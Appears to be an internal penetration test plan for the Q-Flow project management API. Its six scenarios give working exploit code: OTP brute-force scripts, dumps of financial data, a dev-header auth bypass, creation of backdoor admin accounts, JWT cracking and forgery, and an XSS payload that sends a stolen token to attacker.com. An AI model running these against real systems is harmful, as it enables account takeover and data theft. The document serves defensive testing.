# Q-Flow Penetration Test Scenarios

**Application:** Q-Flow — Quality Council of India Project Management Tool  
**Document Version:** 1.0  
**Date:** 2026-05-06  
**Classification:** INTERNAL — RESTRICTED  

---

## Table of Contents

1. [Scope Definition](#1-scope-definition)
2. [Threat Actor Profiles](#2-threat-actor-profiles)
3. [PEN-001 — OTP Brute-Force Account Takeover](#3-pen-001--otp-brute-force-account-takeover)
4. [PEN-002 — Financial Data Exfiltration via Missing Role Check](#4-pen-002--financial-data-exfiltration-via-missing-role-check)
5. [PEN-003 — Dev-Bypass Header in Production Environment](#5-pen-003--dev-bypass-header-in-production-environment)
6. [PEN-004 — Privilege Escalation via JWT Secret Brute-Force](#6-pen-004--privilege-escalation-via-jwt-secret-brute-force)
7. [PEN-005 — CSRF on Sensitive Org Admin Endpoints](#7-pen-005--csrf-on-sensitive-org-admin-endpoints)
8. [PEN-006 — Role Manipulation via Forged JWT Claims](#8-pen-006--role-manipulation-via-forged-jwt-claims)
9. [Consolidated Findings Table](#9-consolidated-findings-table)
10. [Remediation Verification Checklist](#10-remediation-verification-checklist)

---

## 1. Scope Definition

### In-Scope

| Asset | Description | Target |
|---|---|---|
| Backend API | Express.js REST API | `http://localhost:4000` (dev) / `https://api.qflow.qcin.org` (prod) |
| Auth Routes | Login, register, OTP, refresh, logout | `POST /v1/auth/*` |
| Financial Routes | Budgets, invoices, ROI, revenue | `GET|POST /v1/financial/*` |
| Task Routes | CRUD, bulk operations, delete | `GET|POST|PATCH|DELETE /v1/tasks/*` |
| Time Log Routes | User logs, org summary | `GET /v1/time-logs/*` |
| Member Routes | Invite, role update, remove | `POST|PATCH|DELETE /v1/members/*` |
| Authentication Middleware | JWT verification, dev-bypass logic | `backend/src/middleware/auth.js` |
| Frontend SPA | React 18 + Vite, port 5173 | `http://localhost:5173` |
| PostgreSQL DB | Project management data | `localhost:5432` (indirect, via API) |

### Out-of-Scope

| Asset | Reason |
|---|---|
| QCI production network infrastructure | Infrastructure penetration outside this engagement |
| Third-party SMTP provider | External service |
| Microsoft 365 / Outlook integration | External OAuth provider |
| Anthropic AI service | External API |
| AWS S3 (file storage) | Cloud infrastructure, separate engagement |

### Rules of Engagement

- All testing must be performed against dedicated test environments.
- No destructive tests (DROP TABLE, mass delete) against production data.
- Findings must be documented and reported before public disclosure.
- Rate-limit testing must not generate more than 1,000 requests per second.

### Testing Methodology

- **Phase 1:** Passive reconnaissance (code review, endpoint enumeration)
- **Phase 2:** Active scanning (Burp Suite, sqlmap in safe-mode)
- **Phase 3:** Manual exploitation (focused on confirmed vulnerabilities)
- **Phase 4:** Post-exploitation (privilege escalation, lateral movement)

---

## 2. Threat Actor Profiles

| Profile | ID | Description | Motivation | Capability |
|---|---|---|---|---|
| Authenticated Internal Attacker | TA-01 | A `member` or `viewer` employee at QCI with a valid account but limited permissions | Curiosity, data theft, competitive advantage, revenge | Low-to-Medium — can use curl, browser DevTools, and basic scripts |
| Unauthenticated External Attacker | TA-02 | An internet-facing attacker with no credentials | Financial gain, espionage, disruption | Medium-to-High — uses automated scanners, Burp Suite, custom scripts |
| Compromised Account / Insider | TA-03 | A `project_manager` account that has been stolen via phishing | Escalate privileges to `org_admin`, exfiltrate all data | Medium — uses Burp Suite, JWT manipulation |
| Sophisticated Nation-State / APT | TA-04 | State-sponsored actor targeting QCI government-adjacent data | Long-term espionage, sensitive project data | High — uses custom tooling, zero-days, sophisticated persistence |

---

## 3. PEN-001 — OTP Brute-Force Account Takeover

### Overview

| Field | Value |
|---|---|
| **Scenario ID** | PEN-001 |
| **Title** | OTP Brute-Force Account Takeover |
| **Attack Vector** | Network — unauthenticated |
| **Threat Actor** | TA-02 (External Attacker) / TA-01 (Internal) |
| **CVSS v3.1 Score** | **9.1** (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N) |
| **Vulnerability Reference** | VULN-001 |
| **Target Endpoint** | `POST /v1/auth/verify-otp` |

### Attack Objective

Compromise a target user's account by brute-forcing the 6-digit OTP sent during a password reset, then resetting the password to one the attacker controls.

### Prerequisites

- Target user's email address (obtainable from public sources or `/v1/members` if already authenticated as any member)
- Network access to the API (internet-facing or VPN)
- Python 3 or bash scripting capability

### Tools Required

| Tool | Purpose |
|---|---|
| Burp Suite Professional | HTTP interception, automated brute-force via Intruder |
| Python 3 + `requests` library | Custom brute-force script |
| Turbo Intruder (Burp extension) | High-speed parallel request sending |
| `seq` (bash) | Generate OTP code wordlist |

### Step-by-Step Exploitation Walkthrough

**Step 1: Trigger OTP generation**

Send a password reset OTP to the target email. This starts the 10-minute TTL window.

```bash
curl -X POST http://localhost:4000/v1/auth/send-otp \
  -H "Content-Type: application/json" \
  -d '{
    "email": "target.admin@qci.gov.in",
    "purpose": "password_reset"
  }'
```

Expected response:
```json
{
  "success": true,
  "data": {
    "sent": true,
    "expiresAt": "2026-05-06T10:30:00.000Z"
  }
}
```

**Step 2: Assess rate-limiting controls**

Quickly send 12 verify-otp requests with wrong codes to determine if rate limiting kicks in:

```bash
for CODE in 100000 100001 100002 100003 100004 100005 100006 100007 100008 100009 100010 100011; do
  HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST http://localhost:4000/v1/auth/verify-otp \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"target.admin@qci.gov.in\",\"code\":\"$CODE\",\"purpose\":\"password_reset\"}")
  echo "Code: $CODE → $HTTP_CODE"
done
```

**Vulnerable response (no lockout):**
```
Code: 100000 → 400
Code: 100001 → 400
Code: 100002 → 400
Code: 100003 → 400
Code: 100004 → 400
Code: 100005 → 400
Code: 100006 → 400
Code: 100007 → 400
Code: 100008 → 400
Code: 100009 → 400
Code: 100010 → 400
Code: 100011 → 400   ← should be 429 but is not
```

**Hardened response (with rate limiting):**
```
Code: 100000 → 400
...
Code: 100004 → 400
Code: 100005 → 429   ← locked after 5 attempts
```

**Step 3: Full brute-force automation (Burp Suite Turbo Intruder)**

Open Burp Suite → Repeater → right-click → "Send to Turbo Intruder":

```python
# Turbo Intruder script
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=100,
                           pipeline=True)
    for code in range(100000, 1000000):
        engine.queue(target.req, str(code).zfill(6), gate='bruteforce')
    engine.openGate('bruteforce')

def handleResponse(req, interesting):
    if '"verified":true' in req.response:
        table.add(req)
        # Stop on success
        raise RequeueRequest()
```

With 5 concurrent connections and pipeline, the full 900,000-code space can be tested in approximately **15–20 minutes** from a local network.

**Alternative: Python script (distributed across multiple IPs)**

```python
#!/usr/bin/env python3
import requests
import itertools
import threading

TARGET = "http://localhost:4000/v1/auth/verify-otp"
EMAIL = "target.admin@qci.gov.in"

def try_codes(start, end):
    for code in range(start, end):
        payload = {
            "email": EMAIL,
            "code": str(code).zfill(6),
            "purpose": "password_reset"
        }
        r = requests.post(TARGET, json=payload, timeout=5)
        if r.status_code == 200 and r.json().get("data", {}).get("verified"):
            print(f"[+] OTP FOUND: {str(code).zfill(6)}")
            return

# Split keyspace across threads (each thread uses a different source IP via proxy rotation)
threads = []
chunk = 100000
for i in range(10):
    t = threading.Thread(target=try_codes, args=(100000 + i*chunk, 100000 + (i+1)*chunk))
    threads.append(t)
    t.start()
for t in threads:
    t.join()
```

**Step 4: Post-exploitation — password reset**

Once the OTP is verified:
```bash
# The verify-otp call confirms the OTP, but the reset itself requires
# a separate flow. With the verified code, the attacker can:
# Option A: If verify-otp returns a password-reset token:
curl -X POST http://localhost:4000/v1/auth/reset-password \
  -H "Content-Type: application/json" \
  -d '{"email":"target@qci.gov.in","new_password":"attacker_password123","otp":"739284"}'

# Option B: Directly log in with new password after the flow completes
curl -X POST http://localhost:4000/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"target@qci.gov.in","password":"attacker_password123"}'
```

### Impact Chain

```
OTP Brute-Force
    → Account Takeover (victim account)
        → Access to all projects in victim's org
            → If victim is org_admin → Full organizational compromise
                → Exfiltrate all tasks, members, financial data, OKRs
                → Add attacker-controlled accounts to org
                → Modify audit logs (delete evidence)
```

### Expected Vulnerable vs. Hardened Response

| Condition | HTTP Response | Body |
|---|---|---|
| **Vulnerable (no rate limit)** | `400 Bad Request` (for each wrong code) | `{"success":false,"error":{"code":"BAD_REQUEST","message":"Invalid or expired OTP."}}` |
| **Hardened (with lockout)** | `429 Too Many Requests` (after 5th attempt) | `{"success":false,"error":{"code":"RATE_LIMITED","message":"Too many OTP attempts. Please request a new code."}}` |
| **Hardened (OTP invalidated)** | `400 Bad Request` on any further attempt | OTP is invalidated after 5 failed attempts; new OTP required |

---

## 4. PEN-002 — Financial Data Exfiltration via Missing Role Check

### Overview

| Field | Value |
|---|---|
| **Scenario ID** | PEN-002 |
| **Title** | Financial Data Exfiltration via Missing Role Authorization |
| **Attack Vector** | Network — authenticated as low-privilege user |
| **Threat Actor** | TA-01 (Internal Attacker with `member` role) |
| **CVSS v3.1 Score** | **8.6** (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) |
| **Vulnerability Reference** | VULN-002 |
| **Target Endpoints** | All `GET /v1/financial/*`, `POST /v1/financial/*` |

### Attack Objective

A regular QCI employee (`member` role) reads all organizational financial data including budgets, revenue, forecasts, and invoices, then exfiltrates this data.

### Tools Required

| Tool | Purpose |
|---|---|
| curl / Postman | Direct API calls |
| Burp Suite | Intercept and replay requests with different auth tokens |
| jq | Parse and filter JSON output |

### Step-by-Step Exploitation Walkthrough

**Step 1: Authenticate as a member-role user**

```bash
# Using dev bypass in development environment
MEMBER_TOKEN=$(curl -s http://localhost:4000/v1/auth/me \
  -H "X-Dev-User-Id: dev-member-id" | jq -r '.data.access_token' 2>/dev/null || echo "")

# In production — obtain token via normal login
MEMBER_TOKEN=$(curl -s -X POST http://localhost:4000/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"jsmith@qci.gov.in","password":"JohnSmith2024!"}' \
  | jq -r '.data.access_token')
```

**Step 2: Enumerate financial endpoints**

```bash
BASE="http://localhost:4000"
AUTH="X-Dev-User-Id: dev-member-id"

# Attempt each financial endpoint
endpoints=(
  "financial/budgets"
  "financial/budget-vs-actual"
  "financial/cost-breakdown"
  "financial/revenue-attribution"
  "financial/invoices"
  "financial/dashboard"
)

for ep in "${endpoints[@]}"; do
  echo "=== GET /v1/$ep ==="
  curl -s "$BASE/v1/$ep" -H "$AUTH" | jq '.success, (.data | type)'
  echo ""
done
```

**Step 3: Full data dump**

```bash
# Dump all budgets
curl -s "$BASE/v1/financial/budgets" \
  -H "$AUTH" | jq '.' > /tmp/budgets_dump.json

# Dump revenue attribution
curl -s "$BASE/v1/financial/revenue-attribution?year=2026" \
  -H "$AUTH" | jq '.' > /tmp/revenue_dump.json

# Dump all invoices
curl -s "$BASE/v1/financial/invoices" \
  -H "$AUTH" | jq '.' > /tmp/invoices_dump.json

# Get dashboard summary (totals)
curl -s "$BASE/v1/financial/dashboard" \
  -H "$AUTH" | jq '.' > /tmp/financial_summary.json

echo "[+] Exfiltration complete. Files saved."
cat /tmp/financial_summary.json
```

**Step 4: Create unauthorized budget entries**

```bash
# Member creates a fake budget (data integrity attack)
curl -s -X POST "$BASE/v1/financial/budgets" \
  -H "$AUTH" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Shadow Budget",
    "entityType": "project",
    "entityId": "proj-123",
    "totalBudget": 5000000,
    "quarter": "Q2",
    "year": 2026
  }' | jq '.'
```

**Step 5: Read individual budget by ID for targeted data**

```bash
# Once budget IDs are enumerated:
for ID in $(curl -s "$BASE/v1/financial/budgets" -H "$AUTH" \
  | jq -r '.data[].id' 2>/dev/null); do
  echo "=== Budget $ID ==="
  curl -s "$BASE/v1/financial/roi/$ID" -H "$AUTH" | jq '.data.roi'
  curl -s "$BASE/v1/financial/forecast/$ID" -H "$AUTH" | jq '.data'
done
```

### Impact Chain

```
Member-role account access
    → Read all org financial data (budgets, forecasts, invoices, ROI)
        → Exfiltrate to external storage
            → Competitive intelligence leak
            → Regulatory/audit violation
    → Create unauthorized budget records
        → Financial reporting corruption
            → Audit trail contamination
```

### Expected Vulnerable vs. Hardened Response

**Vulnerable (current state):**
```bash
curl -s http://localhost:4000/v1/financial/dashboard \
  -H "X-Dev-User-Id: dev-member-id"
```
```json
{
  "success": true,
  "data": {
    "totalBudget": 12500000,
    "totalSpent": 8750000,
    "totalRevenue": 15200000,
    "activeProjects": 23,
    "budgets": [ ... ]
  }
}
```

**Hardened (after fix):**
```json
{
  "success": false,
  "error": {
    "code": "FORBIDDEN",
    "message": "Insufficient permissions"
  }
}
```

---

## 5. PEN-003 — Dev-Bypass Header in Production Environment

### Overview

| Field | Value |
|---|---|
| **Scenario ID** | PEN-003 |
| **Title** | Full Authentication Bypass via Dev Header in Misconfigured Production |
| **Attack Vector** | Network — unauthenticated |
| **Threat Actor** | TA-02 (External Attacker), TA-04 (APT) |
| **CVSS v3.1 Score** | **9.8** (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| **Vulnerability Reference** | VULN-004 |
| **Prerequisite** | `NODE_ENV` not set to `production` in deployment |

### Attack Objective

Gain full `org_admin` access to the Q-Flow instance without any credentials by sending a single HTTP header.

### Trigger Conditions

This attack succeeds if ANY of the following occur in production:
1. `.env` file has `NODE_ENV=development` (developer forgot to change it)
2. `NODE_ENV` is not set at all (defaults to `undefined`, which !== `'production'`)
3. Container/VM has `NODE_ENV=staging` or any non-`production` value
4. CI/CD pipeline injects `NODE_ENV=development` from a dev configuration

### Tools Required

| Tool | Purpose |
|---|---|
| curl | Single request to test |
| Burp Suite | Systematic check of all endpoints |
| Shodan / Censys | Find exposed Q-Flow instances (reconnaissance phase) |

### Step-by-Step Exploitation Walkthrough

**Step 1: Reconnaissance — confirm Q-Flow instance**

```bash
# Check health endpoint (public, no auth)
curl -s https://api.qflow.qcin.org/health
# Returns: {"status":"ok","timestamp":"2026-05-06T..."}
# Confirms: Server is running
```

**Step 2: Test dev-bypass header**

```bash
# Attempt org_admin bypass
curl -s https://api.qflow.qcin.org/v1/auth/me \
  -H "X-Dev-User-Id: dev-org_admin-id" | jq '.'
```

**Vulnerable Response (NODE_ENV != 'production'):**
```json
{
  "success": true,
  "data": {
    "id": "dev-org_admin-id",
    "email": "admin@example.local",
    "current_role": "org_admin",
    "current_org_id": "dev-org-id",
    "organizations": [...]
  }
}
```

**Step 3: Enumerate all data as org_admin**

```bash
DEV_HDR="X-Dev-User-Id: dev-org_admin-id"
BASE="https://api.qflow.qcin.org"

# Dump all projects
curl -s "$BASE/v1/projects" -H "$DEV_HDR" | jq '.data.items[].name'

# Dump all members
curl -s "$BASE/v1/members" -H "$DEV_HDR" | jq '.data.items[].email'

# Dump all financial data
curl -s "$BASE/v1/financial/dashboard" -H "$DEV_HDR" | jq '.'

# Dump audit log
curl -s "$BASE/v1/audit-logs" -H "$DEV_HDR" | jq '.'
```

**Step 4: Create a persistent backdoor account**

```bash
# Create a new org_admin account with attacker's credentials
curl -s -X POST "$BASE/v1/members/create-direct" \
  -H "$DEV_HDR" \
  -H "Content-Type: application/json" \
  -d '{
    "email": "backdoor@gmail.com",
    "first_name": "System",
    "last_name": "Admin",
    "password": "B@ckd00r2026!",
    "role": "org_admin"
  }'

# Now log in with real credentials (no longer need dev header)
curl -s -X POST "$BASE/v1/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"backdoor@gmail.com","password":"B@ckd00r2026!"}'
```

**Step 5: Cover tracks**

```bash
# If audit logs exist and org_admin can modify them:
# (Specific delete API depends on implementation)
# Attacker removes evidence of their access
```

### Impact Chain

```
NODE_ENV misconfigured in production
    → Any HTTP request with X-Dev-User-Id header is authenticated
        → Zero-credential org_admin access to ALL organizations
            → Full data exfiltration (projects, tasks, financials, members)
            → Create persistent backdoor accounts
            → Delete or corrupt data
            → Impersonate any role (member → division_admin → org_admin)
```

### Expected Vulnerable vs. Hardened Response

| Configuration | Request | Response |
|---|---|---|
| **Vulnerable** (`NODE_ENV=development` or unset) | `GET /v1/auth/me` with `X-Dev-User-Id: dev-org_admin-id` | `200 OK` with full org_admin user object |
| **Hardened** (`NODE_ENV=production`) | Same request | `401 Unauthorized` — dev bypass code path not reached |
| **Defense-in-depth** (CORS header removal) | Browser request with `X-Dev-User-Id` from non-whitelisted origin | CORS preflight fails — browser blocks request |

---

## 6. PEN-004 — Privilege Escalation via JWT Secret Brute-Force

### Overview

| Field | Value |
|---|---|
| **Scenario ID** | PEN-004 |
| **Title** | JWT Secret Brute-Force → Token Forgery → Privilege Escalation |
| **Attack Vector** | Network — authenticated as low-privilege user |
| **Threat Actor** | TA-03 (Compromised Account), TA-04 (APT) |
| **CVSS v3.1 Score** | **8.1** (AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| **Vulnerability Reference** | VULN-009 |
| **Target Component** | JWT signing secret |

### Attack Objective

Obtain or brute-force the `JWT_SECRET` to forge arbitrary tokens with any role, bypassing all role-based access controls.

### Attack Vectors

**Vector A — Known Placeholder Secret (Most Likely)**

If the production deployment uses the default placeholder `JWT_SECRET` from `.env.example`, the attacker already knows it.

**Vector B — JWT Cracking via hashcat/john**

If the attacker can obtain a valid JWT (e.g., from a leaked `localStorage` token via XSS), they can offline-crack the HS256 signature to recover the secret.

### Tools Required

| Tool | Purpose |
|---|---|
| `hashcat` v6+ | GPU-accelerated JWT cracking |
| `john` (John the Ripper) | CPU-based JWT cracking |
| `jwt_tool` | JWT manipulation and forging |
| `jwt.io` (browser) | Manual JWT inspection and editing |
| Python + `PyJWT` | Forge tokens with recovered secret |

### Step-by-Step Exploitation Walkthrough

**Vector A — Direct forgery with known default secret**

```bash
# Step 1: Test if the default secret is in use
# Valid JWT obtained via normal login (any account):
VALID_JWT="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

# Attempt to verify with known placeholder
node -e "
const jwt = require('jsonwebtoken');
try {
  const decoded = jwt.verify('$VALID_JWT', 'dev-secret-change-in-production-min-32-chars');
  console.log('[+] Secret confirmed:', decoded);
} catch(e) {
  console.log('[-] Wrong secret:', e.message);
}
"
```

**If the secret matches, forge an org_admin token:**

```python
#!/usr/bin/env python3
import jwt  # pip install PyJWT
import datetime

# Confirmed secret
SECRET = "dev-secret-change-in-production-min-32-chars"

# Forge a token with org_admin privileges
payload = {
    "sub": "any-existing-user-id",       # Any user ID in the org
    "org_id": "target-org-id",           # Discovered via /v1/auth/me
    "role": "org_admin",                 # Escalated role
    "email": "forged@attacker.com",
    "iat": int(datetime.datetime.now().timestamp()),
    "exp": int((datetime.datetime.now() + datetime.timedelta(hours=24)).timestamp())
}

token = jwt.encode(payload, SECRET, algorithm="HS256")
print(f"[+] Forged token: {token}")
```

```bash
# Use forged token to access org_admin endpoints
curl -s http://localhost:4000/v1/members \
  -H "Authorization: Bearer $FORGED_TOKEN" | jq '.data.items[].email'
```

**Vector B — Offline cracking of a captured JWT**

```bash
# Extract JWT from browser localStorage (if XSS is possible):
# document.querySelector('[key="pm-auth"]') or localStorage.getItem('pm-auth')

# Format for hashcat (mode 16500 = JWT HS256)
CAPTURED_JWT="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyLTEyMyIsIm9yZ19pZCI6Im9yZy00NTYiLCJyb2xlIjoibWVtYmVyIiwiZW1haWwiOiJ1c2VyQHFjaS5nb3YuaW4ifQ.SIGNATURE"

# Create a custom wordlist including known weak secrets:
cat > /tmp/jwt_wordlist.txt << 'EOF'
dev-secret-change-in-production-min-32-chars
replace-with-random-secret-min-32-chars
secret
mysecret
qflow-secret
qci-secret
project-management-secret
jwt-secret-key
development
password123
changeme
EOF

# Run hashcat (GPU):
hashcat -a 0 -m 16500 "$CAPTURED_JWT" /tmp/jwt_wordlist.txt

# If wordlist fails, try brute-force on short secrets:
hashcat -a 3 -m 16500 "$CAPTURED_JWT" '?a?a?a?a?a?a?a?a' --increment --increment-min 6

# Alternative: john the ripper
echo "$CAPTURED_JWT" > /tmp/jwt_hash.txt
john /tmp/jwt_hash.txt --wordlist=/tmp/jwt_wordlist.txt --format=HMAC-SHA256
```

**Step 3: Complete privilege escalation chain**

```bash
# 1. Obtain forged org_admin token
FORGED_TOKEN="<token from step 2>"

# 2. Enumerate all organizations (org_admin can do this)
curl -s "http://localhost:4000/v1/members" \
  -H "Authorization: Bearer $FORGED_TOKEN" | jq '.'

# 3. Add attacker account as org_admin
curl -s -X POST "http://localhost:4000/v1/members/create-direct" \
  -H "Authorization: Bearer $FORGED_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com","first_name":"Admin","last_name":"User","password":"secure_pw","role":"org_admin"}'

# 4. Exfiltrate financial data
curl -s "http://localhost:4000/v1/financial/dashboard" \
  -H "Authorization: Bearer $FORGED_TOKEN"
```

### Expected Vulnerable vs. Hardened Response

| Condition | Test | Result |
|---|---|---|
| **Vulnerable** (default/known secret) | Forge token with org_admin role | Token accepted, org_admin access granted |
| **Hardened** (strong random secret) | Same forged token | `401 TOKEN_EXPIRED` / invalid signature error |
| **Defense-in-depth** (RS256 asymmetric) | Even with private key brute-force | Asymmetric keys resist offline cracking entirely |

---

## 7. PEN-005 — CSRF on Sensitive Org Admin Endpoints

### Overview

| Field | Value |
|---|---|
| **Scenario ID** | PEN-005 |
| **Title** | Cross-Site Request Forgery on Org Admin State-Changing Endpoints |
| **Attack Vector** | Network — requires victim to visit attacker-controlled page |
| **Threat Actor** | TA-02 (External Attacker targeting authenticated users) |
| **CVSS v3.1 Score** | **6.8** (AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N) |
| **Vulnerability Reference** | VULN-006 |

### Attack Objective

Trick a logged-in `org_admin` user into involuntarily submitting an admin action (role promotion, data deletion, budget creation) by visiting a malicious web page.

### Attack Vectors

**Vector A — Cookie-based CSRF (if using refresh token as session)**
The refresh token cookie has `sameSite=strict`, which mitigates cross-site cookie-based CSRF for most scenarios. However, `sameSite=strict` does NOT protect against:
- Requests from the same registrable domain (subdomain attacks)
- CSRF where the access token (in localStorage) is stolen via XSS and used directly

**Vector B — SPA Token Theft via XSS (More Practical)**
Since the access token lives in `localStorage` (key: `pm-auth`), an XSS payload can steal it and make authenticated API calls.

### Tools Required

| Tool | Purpose |
|---|---|
| Burp Suite | CSRF PoC generator |
| Python SimpleHTTPServer | Host malicious HTML page |
| ngrok | Expose local CSRF PoC page to internet |

### Step-by-Step Exploitation Walkthrough

**Vector A — Subdomain CSRF (theoretical)**

If `qflow.qcin.org` serves the API and `uploads.qcin.org` is a subdomain that accepts user file uploads:

```html
<!-- Hosted at https://uploads.qcin.org/evil.html -->
<!-- sameSite=strict does NOT block this — same registrable domain -->
<html>
  <body onload="document.forms[0].submit()">
    <form action="https://api.qflow.qcin.org/v1/members/target-user-id/role"
          method="POST"
          enctype="application/json">
      <!-- Note: JSON CSRF requires CORS misconfiguration or text/plain workaround -->
      <input type="hidden" name="role" value="viewer" />
    </form>
  </body>
</html>
```

**Vector B — XSS + Token Theft → CSRF without cookie**

```javascript
// XSS payload (e.g., injected via task title if stored XSS exists):
// Steal the access token from localStorage
const authData = JSON.parse(localStorage.getItem('pm-auth') || '{}');
const token = authData?.state?.token || authData?.token;

if (token) {
  // Exfiltrate token to attacker server
  fetch('https://attacker.com/steal?t=' + encodeURIComponent(token));

  // Immediately perform privilege escalation
  fetch('/v1/members/victim-user-id/role', {
    method: 'PATCH',
    headers: {
      'Content-Type': 'application/json',
      'Authorization': 'Bearer ' + token
    },
    body: JSON.stringify({ role: 'org_admin' })
  }).then(r => r.json()).then(d => {
    fetch('https://attacker.com/result?d=' + encodeURIComponent(JSON.stringify(d)));
  });
}
```

**Full CSRF PoC for role promotion (Vector B with stolen token):**

```python
#!/usr/bin/env python3
"""
Once attacker has stolen the org_admin's access token via XSS,
they perform the following using the stolen token directly.
"""
import requests

STOLEN_TOKEN = "eyJhbGciOiJIUzI1NiJ9..."  # Stolen from localStorage
BASE = "http://localhost:4000"

# Promote attacker's member account to org_admin
r = requests.patch(
    f"{BASE}/v1/members/attacker-member-id/role",
    json={"role": "org_admin"},
    headers={"Authorization": f"Bearer {STOLEN_TOKEN}",
             "Content-Type": "application/json"}
)
print(f"Role escalation: {r.status_code} — {r.json()}")

# Create a new admin account as a backdoor
r2 = requests.post(
    f"{BASE}/v1/members/create-direct",
    json={"email": "backdoor@evil.com", "first_name": "Sys", "last_name": "Admin",
          "password": "HijackedOrg!2026", "role": "org_admin"},
    headers={"Authorization": f"Bearer {STOLEN_TOKEN}",
             "Content-Type": "application/json"}
)
print(f"Backdoor creation: {r2.status_code} — {r2.json()}")
```

### Expected Vulnerable vs. Hardened Response

| Condition | Behavior |
|---|---|
| **Vulnerable** (no CSRF token, token in localStorage) | XSS steals access token; attacker makes API calls directly — no CSRF token required |
| **Hardened** (CSRF token on state-changing requests) | Server rejects requests without `X-CSRF-Token` header matching session-bound CSRF token |
| **Defense-in-depth** (token in httpOnly cookie only) | XSS cannot access token; CSRF is only possible via cookie which `sameSite=strict` blocks |

---

## 8. PEN-006 — Role Manipulation via Forged JWT Claims

### Overview

| Field | Value |
|---|---|
| **Scenario ID** | PEN-006 |
| **Title** | Privilege Escalation via JWT Claim Manipulation |
| **Attack Vector** | Network — authenticated as low-privilege user |
| **Threat Actor** | TA-03 (Compromised Account / Insider) |
| **CVSS v3.1 Score** | **7.5** (AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N) |
| **Vulnerability Reference** | VULN-005, VULN-009 |

### Attack Objective

Escalate from `member` to `org_admin` by modifying JWT claims without breaking the signature — possible only if the secret is known/weak.

### Attack Scenarios

**Scenario A — Algorithm Confusion (none algorithm)**

Attempt to remove signature validation by switching to the `none` algorithm:

```bash
# Step 1: Obtain your own valid JWT as a member
MEMBER_JWT="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJkZXYtbWVtYmVyLWlkIiwib3JnX2lkIjoiZGV2LW9yZy1pZCIsInJvbGUiOiJtZW1iZXIifQ.SIGNATURE"

# Step 2: Decode and modify payload
# Payload (base64url decoded):
# {"sub":"dev-member-id","org_id":"dev-org-id","role":"member"}

# Modified payload:
# {"sub":"dev-member-id","org_id":"dev-org-id","role":"org_admin"}

MODIFIED_HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_')
MODIFIED_PAYLOAD=$(echo -n '{"sub":"dev-member-id","org_id":"dev-org-id","role":"org_admin","email":"member@example.local"}' | base64 | tr -d '=' | tr '+/' '-_')

NONE_JWT="${MODIFIED_HEADER}.${MODIFIED_PAYLOAD}."

curl -s http://localhost:4000/v1/financial/dashboard \
  -H "Authorization: Bearer $NONE_JWT" | jq '.'
```

**Expected Result (correctly hardened):**
```json
{
  "success": false,
  "error": { "code": "TOKEN_EXPIRED", "message": "Token expired or invalid" }
}
```
The `jwt.verify(token, secret, { algorithms: ['HS256'] })` call specifies the algorithm explicitly — the `none` algorithm attack should be blocked.

**Scenario B — Claim tampering with known secret (extends PEN-004)**

```python
#!/usr/bin/env python3
import jwt
import sys

SECRET = sys.argv[1]  # Pass the confirmed secret as argument
VALID_TOKEN = sys.argv[2]  # Pass a valid token to inspect

# Decode without verification to see claims
decoded = jwt.decode(VALID_TOKEN, options={"verify_signature": False})
print(f"[*] Original claims: {decoded}")

# Re-sign with modified claims
decoded["role"] = "org_admin"
forged = jwt.encode(decoded, SECRET, algorithm="HS256")
print(f"[+] Forged token: {forged}")
```

### Step-by-Step Exploitation Chain

```
1. Obtain valid member-role JWT (via login or dev bypass)
2. Inspect token claims (jwt.io or jwt_tool)
3. Attempt none-algorithm attack → fails if algorithms: ['HS256'] enforced
4. Attempt weak-secret brute-force (PEN-004 Vector B)
5. If secret recovered → forge org_admin token
6. Use forged token to access:
   - GET /v1/financial/* (all financial data)
   - POST /v1/members/create-direct (create backdoor accounts)
   - PATCH /v1/members/:id/role (promote any user)
   - GET /v1/audit-logs (review and potentially manipulate audit trail)
```

### Expected Vulnerable vs. Hardened Response

| Attack | Vulnerable State | Hardened State |
|---|---|---|
| `none` algorithm | Accepted if `algorithms` not pinned | Rejected — `algorithms: ['HS256']` specified in `jwt.verify()` |
| Weak secret (hashcat) | Cracked in seconds from wordlist | Resists cracking — 32+ char random secret |
| Known default secret | Token forged immediately | Rotated secret makes default valueless |

---

## 9. Consolidated Findings Table

| Pen Test ID | Title | CVSS Score | Severity | Exploitable In Prod? | Fix Effort |
|---|---|---|---|---|---|
| PEN-001 | OTP Brute-Force Account Takeover | 9.1 | Critical | Yes | Low |
| PEN-002 | Financial Data Exfiltration | 8.6 | Critical | Yes | Low |
| PEN-003 | Dev-Bypass Header in Production | 9.8 | Critical | Yes (if NODE_ENV misconfigured) | Low |
| PEN-004 | JWT Secret Brute-Force | 8.1 | High | Yes (if default secret) | Low |
| PEN-005 | CSRF on Admin Endpoints | 6.8 | High | Yes (via XSS chain) | High |
| PEN-006 | Role Manipulation via JWT | 7.5 | High | Yes (if secret known) | Low |

---

## 10. Remediation Verification Checklist

After applying fixes, re-run the following checks to confirm remediation:

### PEN-001 (OTP Brute-Force) — Verification

```bash
# Re-test: should get 429 after 5 attempts
for i in {1..6}; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST http://localhost:4000/v1/auth/verify-otp \
    -H "Content-Type: application/json" \
    -d '{"email":"test@example.com","code":"'"$(printf '%06d' $((RANDOM % 900000 + 100000)))"'","purpose":"password_reset"}')
  echo "Attempt $i: HTTP $STATUS"
  [ "$STATUS" = "429" ] && echo "[PASS] Rate limit active at attempt $i" && break
done
```

